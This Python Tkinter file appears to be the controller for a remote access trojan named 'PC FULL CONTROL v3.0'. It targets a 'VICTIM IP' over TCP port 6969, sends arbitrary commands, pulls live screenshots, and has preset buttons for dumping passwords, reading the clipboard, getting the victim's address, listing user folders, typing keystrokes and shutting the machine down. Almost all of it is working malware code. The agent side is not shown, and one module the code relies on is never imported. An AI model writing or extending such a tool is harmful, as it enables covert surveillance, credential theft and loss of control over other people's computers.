import socket
import tkinter as tk
from tkinter import ttk, scrolledtext
from PIL import Image, ImageTk
import io
import threading
import requests
import subprocess
import os

class PCController:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("🔥 PC FULL CONTROL v3.0")
        self.root.geometry("1500x1000")
        self.root.configure(bg="#0d1117")
        
        # TOP: IP + Status
        top_frame = ttk.Frame(self.root)
        top_frame.pack(fill=tk.X, padx=15, pady=10)
        
        ttk.Label(top_frame, text="🎯 VICTIM IP:", font=("Arial", 14, "bold")).pack(side=tk.LEFT)
        self.ip_entry = ttk.Entry(top_frame, width=20, font=("Arial", 12))
        self.ip_entry.insert(0, "127.0.0.1")
        self.ip_entry.pack(side=tk.LEFT, padx=(10, 20))
        
        self.status_label = ttk.Label(top_frame, text="❌ DISCONNECTED", foreground="red", font=("Arial", 12))
        self.status_label.pack(side=tk.LEFT)
        
        ttk.Button(top_frame, text="🔌 CONNECT", command=self.test_connection).pack(side=tk.LEFT)
        
        # LIVE SCREEN
        screen_frame = ttk.LabelFrame(self.root, text="🖥️ LIVE SCREENSHOT", padding=10)
        screen_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        self.screen_label = tk.Label(screen_frame, bg="#1f2937", text="NO SCREENSHOT", fg="white", font=("Arial", 16))
        self.screen_label.pack(expand=True)
        
        # COMMANDS
        cmd_frame = ttk.LabelFrame(self.root, text="⚡ COMMANDS", padding=15)
        cmd_frame.pack(fill=tk.X, padx=15, pady=10)
        
        cmd_input_frame = ttk.Frame(cmd_frame)
        cmd_input_frame.pack(fill=tk.X)
        
        self.cmd_entry = ttk.Entry(cmd_input_frame, font=("Arial", 12))
        self.cmd_entry.pack(side=tk.LEFT, fill=tk.X, expand=True)
        self.cmd_entry.bind("<Return>", lambda e: self.send_cmd())
        
        ttk.Button(cmd_input_frame, text="🚀 EXECUTE", command=self.send_cmd).pack(side=tk.RIGHT, padx=(10,0))
        
        # QUICK BUTTONS (ALLE COMMANDS)
        btn_frame = ttk.Frame(cmd_frame)
        btn_frame.pack(fill=tk.X, pady=(10,0))
        
        buttons = [
            ("!screenshot", "#3b82f6"), ("!getclip", "#10b981"),
            ("!hardware", "#f59e0b"), ("!passwords", "#ef4444"),
            ("!ip", "#8b5cf6"), ("!adresse", "#ec4899"),
            ("!open notepad.exe", "#06b6d4"), ("!list C:\\Users", "#84cc16"),
            ("!shutdown", "#dc2626"), ("!type test", "#f97316")
        ]
        
        for cmd, color in buttons:
            ttk.Button(btn_frame, text=cmd, command=lambda c=cmd: self.cmd_entry.delete(0,tk.END) or self.cmd_entry.insert(0,cmd)).pack(side=tk.LEFT, padx=3)
        
        # LOG
        log_frame = ttk.LabelFrame(self.root, text="📋 RESPONSE LOG", padding=10)
        log_frame.pack(fill=tk.BOTH, expand=True, padx=15, pady=10)
        
        self.log_text = scrolledtext.ScrolledText(log_frame, height=10, font=("Consolas", 10), bg="#1f2937", fg="#e2e8f0")
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
        self.log_text.insert(tk.END, "✅ Controller ready! Set IP → CONNECT → Send Commands!\n")
    
    def log(self, msg):
        self.log_text.insert(tk.END, f"[{self.get_time()}] {msg}\n")
        self.log_text.see(tk.END)
        self.root.update()
    
    def get_time(self):
        return time.strftime("%H:%M:%S")
    
    def test_connection(self):
        threading.Thread(target=self._test_conn, daemon=True).start()
    
    def _test_conn(self):
        try:
            sock = socket.socket()
            sock.settimeout(3)
            sock.connect((self.ip_entry.get(), 6969))
            sock.close()
            self.status_label.config(text="🟢 CONNECTED", foreground="green")
            self.log("✅ Victim connected!")
        except:
            self.status_label.config(text="❌ DISCONNECTED", foreground="red")
            self.log("❌ No victim found!")
    
    def send_cmd(self):
        cmd = self.cmd_entry.get().strip()
        if not cmd: return
        
        threading.Thread(target=self._send_command, args=(cmd,), daemon=True).start()
    
    def _send_command(self, cmd):
        try:
            sock = socket.socket()
            sock.settimeout(15)
            sock.connect((self.ip_entry.get(), 6969))
            
            sock.send(cmd.encode())
            self.log(f"📤 → {cmd}")
            
            if "screenshot" in cmd.lower():
                self._receive_screenshot(sock)
            
            response = sock.recv(8192).decode(errors='ignore')
            if response.strip():
                self.log(f"📥 ← {response}")
            
            sock.close()
        except Exception as e:
            self.log(f"❌ ERROR: {str(e)}")
    
    def _receive_screenshot(self, sock):
        try:
            size = int.from_bytes(sock.recv(4), 'big')
            data = b''
            while len(data) < size:
                data += sock.recv(min(4096, size - len(data)))
            
            img = Image.open(io.BytesIO(data)).resize((900, 700), Image.Resampling.LANCZOS)
            photo = ImageTk.PhotoImage(img)
            self.screen_label.configure(image=photo, text="")
            self.screen_label.image = photo
            self.log("🖥️ Screenshot LIVE!")
        except Exception as e:
            self.log(f"❌ Screenshot error: {e}")
    
    def run(self):
        self.root.mainloop()

if __name__ == "__main__":
    app = PCController()
    app.run()